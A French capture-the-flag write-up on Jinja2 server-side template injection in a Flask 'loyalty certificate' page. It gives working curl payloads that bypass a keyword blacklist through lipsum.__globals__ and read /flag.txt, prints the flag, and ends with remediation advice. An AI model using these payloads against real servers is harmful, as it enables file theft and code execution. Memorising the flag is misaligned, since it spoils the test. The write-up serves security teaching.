# Fidélité — SSTI Avancée (Server-Side Template Injection)

**Catégorie :** Web - RCE
**Difficulté :** Avancée
**Points :** 400

## Objectif

Exploiter une injection de template côté serveur (SSTI) pour contourner un filtre de mots-clés et lire un fichier flag protégé sur le serveur.

## Vulnérabilité

Le endpoint `/` insère directement le nom fourni par l'utilisateur dans le **code source** d'un template Jinja2, avant de le passer à `render_template_string` :

```python
template = f"""
<div class="certificat">
    <h3>Certificat de fidélité</h3>
    <p>Félicitations {nom}, vous êtes client(e) privilégié(e) du Café Saffran !</p>
</div>
"""
certificat = render_template_string(template)
```

Contrairement à un XSS (où l'entrée est affichée telle quelle dans le HTML), ici l'entrée devient une **partie du template lui-même** : toute syntaxe Jinja2 valide (`{{ ... }}`) qu'elle contient est **évaluée côté serveur**, avec accès à tout l'environnement Python de l'application.

Un filtre tente de bloquer les techniques évidentes :
```python
BLACKLIST = [
    "__import__", "os.system", "subprocess", "popen",
    "config", "self", "request.application",
]
```

Cette liste est incomplète — elle bloque des chemins d'accès connus, mais pas tous les moyens d'atteindre le même résultat.

## Exploitation

### Étape 1 — Confirmer la SSTI

```bash
curl -X POST http://<cible>:5006/ --data-urlencode "nom={{7*7}}"
```

Le certificat affiche `49` au lieu du texte littéral `{{7*7}}` — la preuve que l'entrée est évaluée par le moteur Jinja2, pas seulement affichée.

### Étape 2 — Trouver un chemin de contournement du filtre

La première piste habituelle en SSTI Jinja2 (remonter via `__class__.__mro__[1].__subclasses__()` pour trouver une classe comme `subprocess.Popen`) **échoue ici** : `subprocess` n'étant jamais importé par l'application (`app.py` n'importe que `os` et `re`), la classe `Popen` n'est jamais chargée en mémoire Python, et n'apparaît donc jamais dans la liste de sous-classes.

Alternative plus robuste : Jinja2 expose par défaut plusieurs fonctions globales dans l'environnement de template (`lipsum`, `cycler`, `joiner`, `namespace`, `range`...). Chacune est une fonction Python ordinaire, et possède donc un attribut `__globals__` qui donne accès à **toutes les variables globales du module où elle est définie** — notamment les modules importés par ce module (`jinja2.utils`), dont `os`.

```bash
curl -X POST http://<cible>:5006/ --data-urlencode "nom={{ lipsum.__globals__.os }}"
```

Résultat : `<module 'os' (frozen)>` — accès au module `os` confirmé, sans jamais avoir utilisé les mots bloqués (`__import__`, `os.system`, `subprocess`).

### Étape 3 — Lire le flag

Pas besoin d'exécuter une commande système (ce qui nécessiterait `os.system` ou `subprocess`, tous deux filtrés). `__globals__` donne aussi accès à `__builtins__`, qui contient les fonctions natives Python comme `open()` :

```bash
curl -X POST http://<cible>:5006/ --data-urlencode \
  "nom={{ lipsum.__globals__.__builtins__.open('/flag.txt').read() }}"
```

## Résultat

```
Félicitations FLAG{ssti_j1nj4_bl4ckl1st_byp4ss_rce}, vous êtes client(e) privilégié(e) du Café Saffran !
```

## Flag

```
FLAG{ssti_j1nj4_bl4ckl1st_byp4ss_rce}
```

## Point pédagogique

Ce challenge illustre deux leçons importantes sur les SSTI :

1. **Le "payload classique" ne marche pas toujours.** La technique la plus documentée en ligne (`__subclasses__()` pour trouver `Popen`) dépend entièrement de ce que l'application a réellement importé en mémoire. Un bon testeur doit savoir adapter son approche à l'environnement réel, pas seulement copier un payload trouvé en ligne.

2. **Les listes noires de mots-clés sont fondamentalement fragiles en SSTI.** Il existe presque toujours plusieurs chemins d'objets Python pour atteindre la même capacité (ici, lire un fichier) sans jamais écrire le mot filtré. Bloquer `subprocess` ou `__import__` ne protège en rien contre `__globals__`, `__builtins__`, ou d'autres fonctions globales Jinja2 natives (`cycler`, `joiner`) qui offrent des chemins équivalents.

## Remédiation

- **Ne jamais utiliser `render_template_string` avec une entrée utilisateur insérée dans le code du template.** Si une personnalisation est nécessaire, passer la donnée comme **variable de contexte**, jamais comme partie du template :
  ```python
  # Sûr : "nom" est une variable, pas du code de template
  render_template_string("<p>Félicitations {{ nom }}</p>", nom=nom)
  ```
  Dans ce cas, Jinja2 échapperait et afficherait `nom` comme texte, sans jamais l'évaluer comme code.
- Si un moteur de templating doit absolument accepter du code dynamique non fiable, utiliser un environnement **sandboxé** (`jinja2.sandbox.SandboxedEnvironment`), qui restreint l'accès aux attributs dangereux comme `__globals__`, `__class__`, `__subclasses__`.
- Ne jamais compter sur une liste noire de mots-clés comme seule défense contre une SSTI — la liste blanche de fonctionnalités autorisées, ou la sandbox, sont les seules approches robustes.
